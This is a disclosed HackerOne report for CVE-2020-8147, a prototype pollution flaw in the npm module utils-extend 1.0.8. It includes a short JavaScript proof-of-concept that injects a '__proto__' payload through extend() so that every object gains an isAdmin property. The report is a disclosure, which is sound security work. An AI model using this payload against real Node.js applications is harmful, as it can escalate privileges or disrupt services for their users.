# [C] [utils-extend] Prototype pollution 

## Summary
Severity: Critical (CVSS 9.4)
Program: Node.js third-party modules
Weakness: Modification of Assumed-Immutable Data (MAID)
Reporter: tuo4n8
State: resolved
Disclosed: 2020-04-02T08:57:57.394Z
CVE: CVE-2020-8147
Source: https://hackerone.com/reports/801522

## Details
> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!

I would like to report `prototype polution` in `utils-extend`
It allows an attacker to modify the prototype of a base object which can vary in severity depending on the implementation (DoS, access to sensitive data, RCE).

# Module

**module name:** utils-extend
**version:** 1.0.8
**npm page:** `https://www.npmjs.com/package/utils-extend`

## Module Description

> Extend nodejs util api, and it is light weight and simple.

## Module Stats

[1] weekly downloads : **129,956**

# Vulnerability

## Vulnerability Description

## Steps To Reproduce:

1. npm install --save utils-extend
2. create file index.js with content :

```javascript
const { extend } = require('utils-extend');
const payload = '{"__proto__":{"isAdmin":true}}'
const emptyObject = {}
const pollutionObject = JSON.parse(payload);
extend({}, pollutionObject)
console.log(emptyObject.isAdmin)  // true
```

3. run `node index.js` => true 

_Trimmed to 38 lines — full report: https://hackerone.com/reports/801522_
